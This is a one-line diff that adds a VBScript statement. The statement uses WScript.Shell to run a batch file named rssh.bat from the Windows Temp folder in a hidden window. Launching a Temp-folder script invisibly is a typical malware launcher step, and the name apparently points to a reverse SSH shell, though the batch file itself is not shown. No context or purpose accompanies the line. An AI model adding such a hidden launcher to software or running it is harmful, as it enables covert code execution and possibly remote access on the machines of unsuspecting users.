@@ -1,0 +1,1 @@
+CreateObject("Wscript.Shell").Run "C:\Windows\Temp\rssh.bat", 0, True
